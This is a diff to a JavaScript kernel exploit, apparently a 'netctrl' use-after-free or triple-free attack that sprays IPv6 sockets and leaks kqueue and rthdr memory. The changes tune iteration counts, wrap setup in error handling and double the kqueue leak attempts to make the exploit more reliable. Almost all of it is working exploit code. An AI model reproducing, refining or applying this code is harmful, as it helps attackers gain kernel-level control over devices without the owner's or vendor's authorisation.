@@ -117,8 +117,8 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
-var MAIN_LOOP_ITERATIONS = 4;
-var TRIPLEFREE_ITERATIONS = 10;
+var MAIN_LOOP_ITERATIONS = 3;
+var TRIPLEFREE_ITERATIONS = 6;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 4;
@@ -1034,16 +1034,25 @@ function netctrl_exploit() {
 
   yield_to_render(exploit_phase_setup);
 }
+
 function exploit_phase_setup() {
-  var ok = setup();
+  if (exploit_end) return;
+
+  var ok = false;
+  try { ok = setup(); }
+  catch(e) { ok = false; }
+
   if (!ok) {
-    log('Setup failed, aborting exploit.');
+    log('Setup failed — aborting.');
     cleanup();
+    exploit_end = true;
     return;
   }
+
   log('Workers spawned');
   exploit_count = 0;
-  exploit_end = false;
+  exploit_end   = false;
+
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
@@ -1669,7 +1678,7 @@ function leak_kqueue() {
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
-  var MAX_KQ = 3000;
+  var MAX_KQ = 6000;
 
   while (count < MAX_KQ) {
     count++;
@@ -1698,7 +1707,6 @@ function leak_kqueue() {
     close(kq);
     sched_yield();
   }
-  sched_yield();
   if (count >= MAX_KQ) {
     log('leak_kqueue: exceeded MAX_KQ iterations');
     return false;
